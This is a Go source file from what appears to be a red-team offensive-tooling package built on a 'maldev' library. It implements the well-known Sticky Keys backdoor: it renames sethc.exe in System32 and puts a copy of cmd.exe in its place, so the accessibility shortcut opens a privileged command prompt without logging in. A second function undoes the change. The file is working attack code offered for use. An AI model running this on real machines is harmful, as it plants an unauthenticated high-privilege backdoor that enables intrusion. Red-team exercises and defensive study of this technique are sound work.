package redteam

import (
  "os"
  "errors"

  "github.com/D3Ext/maldev/files"
)

func StickyKeys() (error) {
  check := files.Exists("C:\\Windows\\System32\\sethc.exe")
  if (check == true) {
    err := files.Move("C:\\Windows\\System32\\sethc.exe", "C:\\Windows\\System32\\sethc.bak")
    if err != nil {
      return err
    }

    // Copy the cmd.exe binary so when you press SHIFT three times it launchs a privileged cmd
    err = files.Copy("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\sethc.exe")
    if err != nil {
      return err
    }
    
    return nil
  } else {
    return errors.New("sticky keys binary (sethc.exe) doesn't exist")
  }
}

func RevertStickyKeys() (error) {
  check := files.Exists("C:\\Windows\\System32\\sethc.bak")
  check2 := files.Exists("C:\\Windows\\System32\\sethc.exe")
  if (check == true) && (check2 == true) {
    err := os.Remove("C:\\Windows\\System32\\sethc.exe")
    if err != nil {
      return err
    }

    err = files.Move("C:\\Windows\\System32\\sethc.bak", "C:\\Windows\\System32\\sethc.exe")
    if err != nil {
      return err
    }

    return nil
  } else if (check == true) && (check2 == false) {
    return errors.New("sticky keys binary (sethc.exe) doesn't exist")
  } else {
    return errors.New("sticky keys backup (sethc.bak) doesn't exist")
  }
}
